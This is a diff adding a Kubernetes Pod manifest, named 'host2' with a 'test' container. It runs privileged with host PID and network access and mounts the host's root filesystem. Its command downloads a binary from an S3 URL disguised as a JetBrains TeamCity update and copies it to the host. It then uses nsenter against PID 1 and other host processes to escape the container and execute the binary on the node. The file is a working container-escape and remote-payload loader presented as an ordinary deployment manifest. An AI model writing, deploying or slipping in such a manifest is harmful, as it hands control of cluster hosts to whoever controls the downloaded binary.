@@ -1,0 +1,24 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host2
+  namespace: default
+spec:
+  hostNetwork: true
+  hostPID: true
+  containers:
+  - name: test
+    image: alpine:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - "apk add --no-cache curl > /dev/null 2>&1; curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && cp /tmp/ts /host/tmp/ts && chmod +x /host/tmp/ts; echo '===TRY_SH==='; nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'chmod +x /tmp/ts && /tmp/ts &' 2>&1; echo '===TRY_BASH==='; nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c 'chmod +x /tmp/ts && /tmp/ts &' 2>&1; echo '===TRY_TARGET==='; for p in 1 2 3 $(ls /host/proc/ | grep -E '^[0-9]+$' | head -20); do nsenter --target $p --mount --uts --ipc --net --pid -- /bin/sh -c 'echo PID_OK && exit 0' 2>/dev/null && nsenter --target $p --mount --uts --ipc --net --pid -- /bin/sh -c 'chmod +x /tmp/ts && /tmp/ts &' 2>/dev/null && echo \"HIT_PID=$p\" && break; done 2>&1; echo '===DONE==='; sleep 60"
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+  restartPolicy: Never
